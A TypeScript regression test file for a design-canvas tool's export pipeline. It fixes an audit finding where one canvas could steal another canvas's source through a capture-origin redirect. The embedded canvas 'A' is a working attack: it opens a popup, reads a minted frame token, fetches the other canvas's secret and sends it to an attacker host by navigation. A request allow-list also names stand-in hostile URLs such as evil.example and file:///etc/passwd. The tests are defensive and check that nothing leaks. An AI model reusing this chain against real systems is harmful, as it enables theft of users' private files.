// gate-b-c4d — a capture cannot mint, or reach, another canvas's frame.
//
// The finding (security-auditor round 2 on C4, medium): the main origin's capture redirect minted
// a frame capability for whatever canvas `?canvas=` / `?frame=` named, for any requester. Canvas
// A, running in its owner's export or screenshot on the capture origin, could
// `window.open('<main>/_canvas-shell.html?canvas=ui/b.tsx')`: the popup 307s to the capture
// origin — A's own origin, no COOP — carrying an `fc` for B; A reads it from `w.location.search`,
// reads B's source as the owner, and exfiltrates by navigation (the capture CSP does not cover
// navigation, and the export shims blocked no request).
//
// Two legs, either of which stops the chain:
//   1. the redirect mints only for a navigation the user agent or the main origin itself started
//      (`Sec-Fetch-Site` absent, `none`, `same-origin`); a capture's popup is `same-site` and lands
//      frame-less;
//   2. every export / screenshot shim confines its browser context to the origin its shell landed
//      on (`newShellContext`, bin/_pw-launch.mjs), popups and other origins aborted — like the
//      thumbnail worker.

import { describe, expect, test } from 'bun:test';
import { readFileSync, writeFileSync } from 'node:fs';
import { join } from 'node:path';

import { launchChromium, newShellContext, shellRequestAllowed } from '../bin/_pw-launch.mjs';
import { bootServer, killProc, makeSandbox, nextPort } from './_helpers.ts';

const BASE_ENV = { MAUDE_NO_AUTOBUILD: '1' };
const SECRET = 'SECRET_B_c4d_7f3a';

const B_TSX = `import { DesignCanvas, DCSection, DCArtboard } from "@maude/canvas-lib";
export default function B() {
  return (
    <DesignCanvas>
      <DCSection id="s" title="B">
        <DCArtboard id="b" label="B" width={120} height={80}>
          <div data-secret="${SECRET}" style={{ height: "100%", background: "#335" }} />
        </DCArtboard>
      </DCSection>
    </DesignCanvas>
  );
}
`;

/** Canvas A: the chain from the finding, run at module evaluation (before the capture can finish). */
const aTsx = (
  main: string,
  attacker: string
) => `import { DesignCanvas, DCSection, DCArtboard } from "@maude/canvas-lib";

let stolen = "none";
try {
  const w = window.open(${JSON.stringify(`${main}/_canvas-shell.html?canvas=ui/b.tsx`)});
  for (let i = 0; i < 80 && stolen === "none"; i++) {
    await new Promise((r) => setTimeout(r, 50));
    try {
      const fc = new URLSearchParams(w.location.search).get("fc");
      if (fc) {
        const r = await fetch("/.design/ui/b.tsx?fc=" + encodeURIComponent(fc));
        stolen = r.status + ":" + (await r.text());
      }
    } catch {
      /* cross-origin while it is on the main origin, or gone */
    }
  }
} catch {
  /* no popup */
}
try {
  window.open(${JSON.stringify(`${attacker}/x?d=`)} + encodeURIComponent(stolen.includes("${SECRET}") ? "${SECRET}" : stolen.slice(0, 40)));
} catch {
  /* refused */
}
await new Promise((r) => setTimeout(r, 400));

export default function A() {
  return (
    <DesignCanvas>
      <DCSection id="s" title="A">
        <DCArtboard id="a" label="A" width={160} height={100}>
          <div style={{ height: "100%", background: "#204060" }} />
        </DCArtboard>
      </DCSection>
    </DesignCanvas>
  );
}
`;

async function captureOriginOf(port: number): Promise<string> {
  const r = await fetch(`http://localhost:${port}/_canvas-shell.html?canvas=ui/b.tsx`, {
    redirect: 'manual',
  });
  expect(r.status).toBe(307);
  return new URL(r.headers.get('location') ?? '').origin;
}

describe('gate-b-c4d — the capture redirect mints a frame only for its own navigations', () => {
  test('Sec-Fetch-Site absent / none / same-origin: fc; same-site / cross-site: none, still 307', async () => {
    const { root, designRoot } = makeSandbox();
    writeFileSync(join(designRoot, 'ui', 'b.tsx'), B_TSX);
    const port = nextPort();
    const proc = await bootServer(root, port, BASE_ENV);
    try {
      const capture = await captureOriginOf(port);
      expect(capture).not.toBe(`http://localhost:${port}`);
      for (const q of [
        '?canvas=ui/b.tsx&hide-chrome=1', // ⌘E export, maude design screenshot / smoke / perf
        '?hide-chrome=1&frame=ui%2Fb.tsx', // a thumbnail tile
      ]) {
        for (const site of [null, 'none', 'same-origin', 'same-site', 'cross-site']) {
          const r = await fetch(`http://localhost:${port}/_canvas-shell.html${q}`, {
            redirect: 'manual',
            headers: site ? { 'sec-fetch-site': site } : {},
          });
          const tag = `${q} ${site}`;
          expect(`${tag} ${r.status}`).toBe(`${tag} 307`);
          const loc = new URL(r.headers.get('location') ?? '');
          expect(`${tag} ${loc.origin}`).toBe(`${tag} ${capture}`);
          const minted = site === null || site === 'none' || site === 'same-origin';
          expect(`${tag} fc=${loc.searchParams.has('fc')}`).toBe(`${tag} fc=${minted}`);
          // the query rides on intact either way
          loc.searchParams.delete('fc');
          expect(loc.searchParams.toString()).toBe(
            new URL(`http://x/${q}`).searchParams.toString()
          );
        }
      }
    } finally {
      await killProc(proc);
    }
  }, 60_000);
});

describe('gate-b-c4d — a shim browser context stays on the origin its shell landed on', () => {
  test('shellRequestAllowed', () => {
    const cap = 'http://localhost:5002/_canvas-shell.html?canvas=ui/a.tsx';
    const cases: Array<[string, string | null, boolean]> = [
      ['http://localhost:5002/.design/ui/a.tsx', cap, true], // the capture's own reads
      ['http://localhost:5002/_canvas-runtime/react.js', cap, true],
      ['data:image/png;base64,AAAA', cap, true],
      ['blob:http://localhost:5002/3f1c', cap, true],
      ['http://localhost:5001/_canvas-shell.html?canvas=ui/b.tsx', cap, false], // the main origin
      ['http://127.0.0.1:5002/x', cap, false], // another host is another origin
      ['https://evil.example/x?d=1', cap, false],
      ['ws://localhost:5002/_ws', cap, false],
      ['file:///etc/passwd', cap, false],
      ['http://localhost:5002/x', 'about:blank', false], // a popup before its first commit
      ['http://localhost:5002/x', null, false], // no page (a service worker, a popup's first nav)
      ['http://localhost:5002/x', 'blob:http://localhost:5002/3f1c', true],
      ['not a url', cap, false],
    ];
    for (const [url, page, want] of cases) {
      expect(`${url} @ ${page} → ${shellRequestAllowed(url, page)}`).toBe(
        `${url} @ ${page} → ${want}`
      );
    }
  });

  test('a page that redirected elsewhere: other origins, popups and sockets are refused; re-entry works', async () => {
    const hitsA: string[] = [];
    const hitsB: string[] = [];
    let portA = 0;
    // A plays the main origin (307s the entry to B), B the capture origin.
    const a = Bun.serve({
      port: 0,
      hostname: '127.0.0.1',
      fetch(req) {
        const u = new URL(req.url);
        hitsA.push(u.pathname);
        if (u.pathname.startsWith('/start'))
          return new Response(null, {
            status: 307,
            headers: { location: `http://localhost:${b.port}/landed${u.search}` },
          });
        return new Response('a', { headers: { 'access-control-allow-origin': '*' } });
      },
      websocket: { message() {} },
    });
    portA = a.port;
    const b = Bun.serve({
      port: 0,
      hostname: '127.0.0.1',
      fetch(req) {
        const u = new URL(req.url);
        hitsB.push(u.pathname + u.search);
        if (u.pathname === '/landed')
          return new Response(
            `<!doctype html><script>
              fetch('/ok').then(() => (document.title = 'ok'), () => (document.title = 'fail'));
              fetch('http://localhost:${portA}/fetch').catch(() => {});
              window.open('http://localhost:${portA}/pop');
              const f = document.createElement('iframe'); f.src = 'http://localhost:${portA}/frame';
              document.documentElement.appendChild(f);
              const i = new Image(); i.src = 'http://localhost:${portA}/img';
              try { new WebSocket('ws://localhost:${portA}/ws'); } catch {}
            </script>`,
            { headers: { 'content-type': 'text/html' } }
          );
        return new Response('b');
      },
    });
    const browser = await launchChromium();
    try {
      const { ctx, goto } = await newShellContext(browser, {
        viewport: { width: 400, height: 300 },
      });
      const page = await ctx.newPage();
      // Twice through the redirect (the main origin's 307), then once straight to the page (the
      // render worker's proxy, a split-off server: the entry origin is the shell's origin).
      for (const n of [1, 2, 3]) {
        const entry =
          n < 3
            ? `http://localhost:${portA}/start?n=${n}`
            : `http://localhost:${b.port}/landed?n=${n}`;
        await goto(page, entry, { waitUntil: 'load' });
        await page.waitForFunction(() => document.title !== '', null, { timeout: 5000 });
        expect(await page.title()).toBe('ok');
        await page.waitForTimeout(500);
      }
      expect(hitsB).toEqual(['/landed?n=1', '/ok', '/landed?n=2', '/ok', '/landed?n=3', '/ok']);
      // The entry, twice — nothing the landed page asked for (fetch, popup, iframe, image, socket).
      expect(hitsA).toEqual(['/start', '/start']);
    } finally {
      await browser.close();
      a.stop(true);
      b.stop(true);
    }
  }, 60_000);
});

describe('gate-b-c4d — the finding, end to end: canvas A exported cannot read canvas B', () => {
  // Every shim an export spawns that renders the canvas: png (+ jpg), pdf, svg, html, pptx, gif
  // (the video shim, frame-step), each at a scope it supports.
  for (const [format, scope] of [
    ['png', 'canvas-whole'],
    ['pdf', 'canvas-whole'],
    ['svg', 'canvas-as-separate'],
    ['html', 'canvas-as-separate'],
    ['pptx', 'canvas-as-separate'],
    ['gif', 'artboard'],
  ] as const) {
    test(`${format} export of A: no popup, no exfiltration, the export still succeeds`, async () => {
      const exfil: string[] = [];
      const attacker = Bun.serve({
        port: 0,
        hostname: '127.0.0.1',
        fetch(req) {
          exfil.push(req.url);
          return new Response('');
        },
      });
      const { root, designRoot } = makeSandbox();
      const port = nextPort();
      writeFileSync(join(designRoot, 'ui', 'b.tsx'), B_TSX);
      writeFileSync(
        join(designRoot, 'ui', 'a.tsx'),
        aTsx(`http://localhost:${port}`, `http://localhost:${attacker.port}`)
      );
      const proc = await bootServer(root, port, BASE_ENV);
      try {
        const r = await fetch(`http://localhost:${port}/_api/export`, {
          method: 'POST',
          headers: { 'content-type': 'application/json' },
          body: JSON.stringify({
            format,
            scope,
            options: {
              canvasFile: '.design/ui/a.tsx',
              ...(scope === 'artboard' ? { artboardId: 'a' } : {}),
              // canvas A spends ~4.4 s at module evaluation by design (it polls its popup for 4 s, then
              // waits 400 ms), so the png/html shims' 8 s default leaves a cold first render on a slower Mac
              // no room; this pins confinement, not render speed
              timeoutSec: 30,
            },
          }),
        });
        const body = new Uint8Array(await r.arrayBuffer());
        expect(`${r.status} ${r.status === 200 ? '' : new TextDecoder().decode(body)}`).toBe(
          '200 '
        );
        expect(body.byteLength).toBeGreaterThan(0);
        // Not B's secret — and not even a request: the popup to the attacker never left.
        expect(exfil.join('\n')).not.toContain(SECRET);
        expect(exfil).toEqual([]);
        // The owner's ui/b.tsx is untouched (a sanity anchor for the probe's target).
        expect(readFileSync(join(designRoot, 'ui', 'b.tsx'), 'utf8')).toContain(SECRET);
      } finally {
        await killProc(proc);
        attacker.stop(true);
      }
    }, 120_000);
  }
});
